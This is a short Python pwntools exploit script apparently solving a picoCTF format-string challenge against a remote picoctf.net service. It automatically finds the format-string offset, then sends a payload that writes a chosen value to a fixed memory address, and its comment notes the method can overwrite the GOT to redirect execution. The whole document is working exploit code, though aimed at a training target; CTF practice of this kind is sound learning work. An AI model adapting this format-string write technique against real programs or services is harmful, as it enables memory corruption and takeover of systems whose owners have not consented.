### This can be used to overwrite GOT to direct execution to any win function
from pwn import *

elf = context.binary = ELF('./vuln')
context.log_level = 'critical'
host = 'rhea.picoctf.net'
port = 51098
p = remote(host,port)

def exec_fmt(payload):
    io = remote(host,port)
    io.sendline(payload)
    return io.recvall()


autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

print(offset)

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)
print(p.recvall().decode('latin-1'))
